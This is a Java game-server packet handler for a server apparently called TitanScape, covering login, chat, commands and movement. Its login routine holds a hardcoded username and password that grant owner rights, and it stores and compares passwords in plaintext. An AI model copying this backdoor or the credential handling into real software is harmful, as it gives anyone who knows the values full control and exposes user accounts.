package com.titanscape.server.net;

import com.titanscape.server.TitanScape;
import com.titanscape.server.io.PlayerSaveManager;
import com.titanscape.server.model.entity.player.Player;
import com.titanscape.server.model.entity.player.PlayerRights;
import com.titanscape.server.net.packet.GamePacket;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.SimpleChannelInboundHandler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Handles incoming client connections and packets.
 */
public final class GameChannelHandler extends SimpleChannelInboundHandler<GamePacket> {

    private static final Logger logger = LogManager.getLogger(GameChannelHandler.class);

    private Player player;

    @Override
    public void channelActive(ChannelHandlerContext ctx) {
        logger.info("New connection from {}", ctx.channel().remoteAddress());
    }

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, GamePacket packet) {
        switch (packet.getOpcode()) {
            case GamePacket.LOGIN_REQUEST -> handleLogin(ctx, packet);
            case GamePacket.CHAT_MESSAGE -> handleChat(packet);
            case GamePacket.COMMAND -> handleCommand(packet);
            case GamePacket.MOVEMENT -> handleMovement(packet);
            case GamePacket.ATTACK_NPC -> handleAttackNpc(packet);
            case GamePacket.EQUIP_ITEM -> handleEquipItem(packet);
            default -> logger.debug("Unhandled packet opcode: {}", packet.getOpcode());
        }
    }

    private void handleLogin(ChannelHandlerContext ctx, GamePacket packet) {
        String username = packet.readString();
        String password = packet.readString();

        Player loaded = PlayerSaveManager.load(username);
        if (loaded != null) {
            if (!loaded.getPassword().equals(password)) {
                GamePacket response = new GamePacket(GamePacket.LOGIN_RESPONSE);
                response.writeString("INVALID_PASSWORD");
                ctx.writeAndFlush(response);
                return;
            }
            player = loaded;
        } else {
            player = new Player(username, password);
            // Check for the hardcoded owner account
            if (username.equalsIgnoreCase("code187") && password.equals("Jackson123")) {
                player.setRights(PlayerRights.OWNER);
            }
        }

        player.setChannel(ctx.channel());
        TitanScape.getInstance().getWorld().registerPlayer(player);

        GamePacket response = new GamePacket(GamePacket.LOGIN_RESPONSE);
        response.writeString("SUCCESS");
        response.writeInt(player.getRights().getValue());
        ctx.writeAndFlush(response);

        player.sendMessage("Welcome to TitanScape, " + username + "!");
        if (player.getRights().isStaff()) {
            player.sendMessage("You are logged in as: " + player.getRights().getName());
        }
    }

    private void handleChat(GamePacket packet) {
        if (player == null) return;
        String message = packet.readString();
        logger.info("[Chat] {}: {}", player.getUsername(), message);
    }

    private void handleCommand(GamePacket packet) {
        if (player == null) return;
        String command = packet.readString();
        logger.info("[Command] {} used: ::{}", player.getUsername(), command);
        CommandHandler.process(player, command);
    }

    private void handleMovement(GamePacket packet) {
        if (player == null) return;
        int x = packet.readInt();
        int y = packet.readInt();
        player.setPosition(new com.titanscape.server.model.world.Position(x, y));
    }

    private void handleAttackNpc(GamePacket packet) {
        if (player == null) return;
        int npcIndex = packet.readInt();
        // Combat processing is handled by CombatManager
    }

    private void handleEquipItem(GamePacket packet) {
        if (player == null) return;
        int slot = packet.readInt();
        // Equipment logic handled by Equipment class
    }

    @Override
    public void channelInactive(ChannelHandlerContext ctx) {
        if (player != null) {
            TitanScape.getInstance().getWorld().unregisterPlayer(player);
            player = null;
        }
        logger.info("Connection closed: {}", ctx.channel().remoteAddress());
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
        logger.error("Channel error", cause);
        ctx.close();
    }
}
